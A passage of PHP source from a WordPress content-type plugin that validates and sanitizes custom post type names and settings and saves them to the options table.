		foreach ( CCTM::$reserved_prefixes as $rp ) {
			if ( preg_match('/^'.preg_quote($rp).'.*/', $data['post_type']) ) {
				return sprintf( __('The post type name cannot begin with %s because that is a reserved prefix.', CCTM_TXTDOMAIN)
					, $rp);
			}
		}

		$registered_post_types = get_post_types();
		$cctm_post_types = array_keys(CCTM::$data['post_type_defs']); // this will include foreigns
		$other_post_types = array_diff($registered_post_types, $cctm_post_types);
		$other_post_types = array_diff($other_post_types, CCTM::$reserved_post_types);
		$dead_foreigners = array();
		foreach ($cctm_post_types as $pt) {
			if (isset(CCTM::$data['post_type_defs'][$pt]['is_foreign']) 
				&& CCTM::$data['post_type_defs'][$pt]['is_foreign']
				&& !in_array($pt, $registered_post_types)
				) {
				$dead_foreigners[] = $pt;
			}
		}
		
		// Is reserved name?
		if ( in_array($data['post_type'], CCTM::$reserved_post_types) ) {
			$msg = __('Please choose another name.', CCTM_TXTDOMAIN );
			$msg .= ' ';
			$msg .= sprintf( __('%s is a reserved name.', CCTM_TXTDOMAIN )
				, '<strong>'.$post_type.'</strong>' );
			return $msg;
		}
		// Make sure the post-type name does not conflict with any registered taxonomies
		elseif ( in_array( $data['post_type'], $taxonomy_names_array) ) {
			$msg = __('Please choose another name.', CCTM_TXTDOMAIN );
			$msg .= ' ';
			$msg .= sprintf( __('%s is already in use as a registered taxonomy name.', CCTM_TXTDOMAIN)
				, $post_type );
			return $msg;
		}
		// If this is a new post_type or if the $post_type name has been changed,
		// ensure that it is not going to overwrite an existing post type name.
		elseif ( $new && is_array(CCTM::$data['post_type_defs']) 
			&& in_array($data['post_type'], $cctm_post_types ) 
			&& !in_array($data['post_type'], $dead_foreigners)
			) {
			return sprintf( __('The name %s is already in use.', CCTM_TXTDOMAIN), htmlspecialchars($data['post_type']) );
		}
		// Is the name taken by an existing post type registered by some other plugin?
		elseif (in_array($data['post_type'], $other_post_types) ) {
			return sprintf( __('The name %s has been registered by some other plugin.', CCTM_TXTDOMAIN), htmlspecialchars($data['post_type']) );
		}
		// Make sure there's not an unsuspecting theme file named single-my_post_type.php
		/*
		$dir = get_stylesheet_directory();
		if ( file_exists($dir . '/single-'.$data['post_type'].'.php')) {
			return sprintf( __('There is a template file named single-%s.php in your theme directory (%s).', CCTM_TXTDOMAIN)
				, htmlspecialchars($data['post_type'])
				, get_stylesheet_directory());
		}
		*/

		return; // no errors
	}

	//------------------------------------------------------------------------------
	/**
	 * Everything when creating a new post type must be filtered here.
	 *
	 * Problems with:
	 *  hierarchical
	 *  rewrite_with_front
	 *
	 * This is janky... sorta doesn't work how it's supposed when combined with save_post_type_settings().
	 *
	 *
	 * @param mixed   $raw unsanitized $_POST data
	 * @return mixed filtered $_POST data (only white-listed are passed thru to output)
	 */
	public static function sanitize_post_type_def($raw) {
		$sanitized = array();

		unset($raw['custom_content_type_mgr_create_new_content_type_nonce']);
		unset($raw['custom_content_type_mgr_edit_content_type_nonce']);

		$raw = CCTM::striptags_deep(($raw));

		// WP always adds slashes: see http://kovshenin.com/archives/wordpress-and-magic-quotes/
		$raw = CCTM::stripslashes_deep(($raw));

		
		// Handle unchecked checkboxes
		if ( empty($raw['cctm_hierarchical_custom'])) {
			$sanitized['cctm_hierarchical_custom'] = '';
		}
		if ( empty($raw['cctm_hierarchical_includes_drafts'])) {
			$sanitized['cctm_hierarchical_includes_drafts'] = '';
		}
		if ( empty($raw['cctm_hierarchical_post_types'])) {
			$sanitized['cctm_hierarchical_post_types'] = array();
		}
		if ( !isset($raw['cctm_custom_columns_enabled'])) {
			$sanitized['cctm_custom_columns_enabled'] = 0;
		}
		if ( !isset($raw['cctm_enable_right_now'])) {
			$sanitized['cctm_enable_right_now'] = 0;
		}
		

		// This will be empty if no "supports" items are checked.
		if (!empty($raw['supports']) ) {
			$sanitized['supports'] = $raw['supports'];
			unset($raw['supports']);
		}
		else {
			$sanitized['supports'] = array();
		}

		if (!empty($raw['taxonomies']) ) {
			$sanitized['taxonomies'] = $raw['taxonomies'];
		}
		else {
			// do this so this will take precedence when you merge the existing array with the new one in the save_post_type_settings() function.
			$sanitized['taxonomies'] = array();
		}
		// You gotta unset arrays if you want the foreach thing below to work.
		unset($raw['taxonomies']);

		// Temporary thing... ????
		unset($sanitized['rewrite_slug']);

		// The main event
		// We grab everything except stuff that begins with '_', then override specific $keys as needed.
		foreach ($raw as $key => $value ) {
			if ( !preg_match('/^_.*/', $key) ) {
				$sanitized[$key] = CCTM::get_value($raw, $key);
			}
		}

		// Specific overrides below:
		$sanitized['description'] = strip_tags($raw['description']);
		
		// post_type is the only required field
		$sanitized['post_type'] = CCTM::get_value($raw, 'post_type');
		$sanitized['post_type'] = strtolower($sanitized['post_type']);
		$sanitized['post_type'] = preg_replace('/[^a-z0-9_\-]/', '_', $sanitized['post_type']);
		$sanitized['post_type'] = substr($sanitized['post_type'], 0, 20);

		// Our form passes integers and strings, but WP req's literal booleans,
		// so we do some type-casting here to ensure literal booleans.
		$sanitized['public']    = (bool) CCTM::get_value($raw, 'public');
		$sanitized['rewrite_with_front']     = (bool) CCTM::get_value($raw, 'rewrite_with_front');
		$sanitized['show_ui']     = (bool) CCTM::get_value($raw, 'show_ui');
		$sanitized['public']     = (bool) CCTM::get_value($raw, 'public');
		$sanitized['show_in_nav_menus']  = (bool) CCTM::get_value($raw, 'show_in_nav_menus');
		$sanitized['can_export']    = (bool) CCTM::get_value($raw, 'can_export');
		$sanitized['use_default_menu_icon'] = (bool) CCTM::get_value($raw, 'use_default_menu_icon');
		$sanitized['hierarchical']    = (bool) CCTM::get_value($raw, 'hierarchical');
		$sanitized['include_in_search']    = (bool) CCTM::get_value($raw, 'include_in_search');
		$sanitized['publicly_queryable']    = (bool) CCTM::get_value($raw, 'publicly_queryable');
		$sanitized['include_in_rss']    = (bool) CCTM::get_value($raw, 'include_in_rss');
		$sanitized['map_meta_cap']    = (bool) CCTM::get_value($raw, 'map_meta_cap');
		$sanitized['show_in_admin_bar']    = (bool) CCTM::get_value($raw, 'show_in_admin_bar');

		if ( empty($sanitized['has_archive']) ) {
			$sanitized['has_archive'] = false;
		}
		else {
			$sanitized['has_archive'] = true;
		}

		// *facepalm*... Special handling req'd here for menu_position because 0
		// is handled differently than a literal null.
		if ( (int) CCTM::get_value($raw, 'menu_position') ) {
			$sanitized['menu_position'] = (int) CCTM::get_value($raw, 'menu_position', null);
		}
		else {
			$sanitized['menu_position'] = null;
		}
		$sanitized['show_in_menu']    = CCTM::get_value($raw, 'show_in_menu');

		$sanitized['cctm_show_in_menu']    = CCTM::get_value($raw, 'cctm_show_in_menu');


		// menu_icon... the user will lose any custom Menu Icon URL if they save with this checked!
		// TODO: let this value persist.
		if ( $sanitized['use_default_menu_icon'] ) {
			unset($sanitized['menu_icon']); // === null;
		}

		if (empty($sanitized['query_var'])) {
			$sanitized['query_var'] = false;
		}

		// Cleaning up the labels
		if ( empty($sanitized['label']) ) {
			$sanitized['label'] = ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['singular_name']) ) {
			$sanitized['labels']['singular_name'] = ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['add_new']) ) {
			$sanitized['labels']['add_new'] = __('Add New');
		}
		if ( empty($sanitized['labels']['add_new_item']) ) {
			$sanitized['labels']['add_new_item'] = __('Add New') . ' ' .ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['edit_item']) ) {
			$sanitized['labels']['edit_item'] = __('Edit'). ' ' .ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['new_item']) ) {
			$sanitized['labels']['new_item'] = __('New'). ' ' .ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['view_item']) ) {
			$sanitized['labels']['view_item'] = __('View'). ' ' .ucfirst($sanitized['post_type']);
		}
		if ( empty($sanitized['labels']['search_items']) ) {
			$sanitized['labels']['search_items'] = __('Search'). ' ' .ucfirst($sanitized['labels']['menu_name']);
		}
		if ( empty($sanitized['labels']['not_found']) ) {
			$sanitized['labels']['not_found'] = sprintf( __('No %s found', CCTM_TXTDOMAIN), strtolower($raw['labels']['menu_name']) );
		}
		if ( empty($sanitized['labels']['not_found_in_trash']) ) {
			$sanitized['labels']['not_found_in_trash'] = sprintf( __('No %s found in trash', CCTM_TXTDOMAIN), strtolower($raw['labels']['menu_name']) );
		}
		if ( empty($sanitized['labels']['parent_item_colon']) ) {
			$sanitized['labels']['parent_item_colon'] = __('Parent Page');
		}


		// Rewrites. TODO: make this work like the built-in post-type permalinks
		switch ($sanitized['permalink_action']) {
		case '/%postname%/':
			$sanitized['rewrite'] = true;
			break;
		case 'Custom':
			$sanitized['rewrite']['slug'] = $raw['rewrite_slug'];
			$sanitized['rewrite']['with_front'] = isset($raw['rewrite_with_front']) ? (bool) $raw['rewrite_with_front'] : false;
			break;
		case 'Off':
		default:
			$sanitized['rewrite'] = false;
		}
		
		return $sanitized;
	}


	//------------------------------------------------------------------------------
	/**
	 * this saves a serialized data structure (arrays of arrays) to the db
	 *
	 * @return
	 * @param mixed   $def associative array definition describing a single post-type.
	 */
	public static function save_post_type_settings($def) {

		$key = $def['post_type'];

		unset(CCTM::$data['post_type_defs'][$key]['original_post_type_name']);

		// Update existing settings if this post-type has already been added
		if ( isset(CCTM::$data['post_type_defs'][$key]) ) {
			CCTM::$data['post_type_defs'][$key] = array_merge(CCTM::$data['post_type_defs'][$key], $def);
		}
		// OR, create a new node in the data structure for our new post-type
		else {
			CCTM::$data['post_type_defs'][$key] = $def;
		}
		if (CCTM::$data['post_type_defs'][$key]['use_default_menu_icon']) {
			unset(CCTM::$data['post_type_defs'][$key]['menu_icon']);
		}

		update_option( CCTM::db_key, CCTM::$data );
	}
}
/*EOF*/